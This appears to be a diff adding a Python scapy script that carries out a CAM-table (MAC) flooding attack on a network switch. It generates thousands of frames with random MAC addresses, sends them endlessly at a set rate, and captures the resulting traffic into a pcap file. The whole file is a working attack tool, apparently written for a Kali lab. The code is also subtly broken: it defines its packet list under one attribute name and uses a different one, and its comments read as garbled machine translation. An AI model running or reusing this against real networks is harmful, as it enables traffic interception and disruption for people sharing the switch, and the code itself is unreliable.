@@ -1,0 +1,111 @@
+import sys
+
+from multiprocessing import Process
+
+from scapy.all import Ether, sendpfast, RandIP, RandMAC, sniff
+from scapy.layers.inet import IP
+from scapy.utils import PcapWriter
+
+
+class CamFlooding(object):
+
+    def __init__(self, interface, pps, camsize):
+        """
+        An init method for starting settings.
+
+        :p aram string interface: interface on which to launch the attack
+		:p aram int pps: number of frames to send per second
+		:p aram int camsize: CAM table size (or number of random @MAC to generate and send)
+        """
+        self.interface = interface
+        self.pps = pps
+        self.camsize = camsize
+        self.liste_paquets = []  # attribut qui contiendra les paquets générés
+
+    # end __init__
+
+    def flood(self):
+        """
+        Function that initiates flooding. sendpfast allows you to send packages at a certain speed.
+        """
+        while True:
+            sendpfast(self.list1_packets, iface=self.interface, file_cache=True, verbose=False, pps=self.pps)
+        # end while
+
+    # end flood
+
+    @staticmethod
+    def vers_pcap(pkt):
+        """
+        A function that allows you to send snorted packets to a pcap file.
+
+        :p aram pkt: package sent by the sniff function
+        """
+        pcap = PcapWriter("/home/kali/Downloads/cam_flooding.pcap", append=True, sync=True)
+        return pcap.write(pkt)
+
+    # end vers_pcap
+
+    def lancer(self):
+        """
+        The attack's entry function.
+        """
+
+        print ("------ Launch of the CamFlooding Attack")
+
+        print("Generation of unique MAC addresses...".format(self.camsize))
+
+        p1 = Process(target=self.flood)
+
+        try:
+            #Generating a list of unique mac addresses based on the size of the CAM table
+
+            macs = []
+            while len(macs) != self.camsize:
+                genmac = RandMAC()
+                if genmac not in macs:
+                    macs.append(genmac)
+                    print("inside the genmac append")
+                # end if
+                # end while
+            #Generation of packages to send to the switch
+
+            print("Generation of packages to send...".format(self.camsize))
+            for mac in macs:
+                packet = Ether(src=mac, dst=RandMAC()) / IP(src="10.0.2.15 ", dst=RandIP())
+                self.list1_packets.append(packet)
+            # end for
+            #Start of the flooding process
+            print ("Starting the flooding and sniffing process")
+            p1.start()
+            print ("Press [CTRL-C] to stop")
+
+            #Sniffing, the prn setting allows you to apply a function to each captured package
+            sniff(iface=self.interface, prn=self.vers_pcap, exceptions=True)
+        # end try
+        except KeyboardInterrupt:
+            if p1.is_alive():
+                p1.terminate()
+            print ("Break the flooding and capture process")
+        # end except
+
+        print("Recording packages sent and received in pcaps/cam_flooding.pcap")
+        print("------ CamFlooding Attack Completed-------")
+
+    # end lancer
+
+
+# end Class CamFlooding
+
+def main():
+    cam = CamFlooding(interface="eth1", pps=500, camsize=8192)
+    cam.lancer()
+
+    return 0
+
+
+# end main
+
+if (__name__ == '__main__'):
+    sys.exit(main())
+# end if
